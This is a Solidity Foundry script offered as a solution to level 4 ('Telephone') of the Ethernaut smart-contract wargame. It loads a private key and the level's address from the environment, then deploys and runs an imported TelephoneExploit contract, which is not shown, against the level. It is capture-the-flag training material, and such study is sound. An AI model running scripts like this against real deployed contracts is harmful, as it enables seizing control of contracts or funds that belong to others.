// SPDX-License-Identifier: CC-BY-4.0
// bt3gl's solution to ethernaut

pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {Telephone} from "src/04/Telephone.sol";
import {TelephoneExploit} from "src/04/TelephoneExploit.sol";

contract Exploit is Script {

        address instance = vm.envAddress("INSTANCE_LEVEL4");
        Telephone level = Telephone(instance);        
        
        function run() external {

            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            
            TelephoneExploit exploit = new TelephoneExploit();
            exploit.run(level);

            vm.stopBroadcast();
    }
}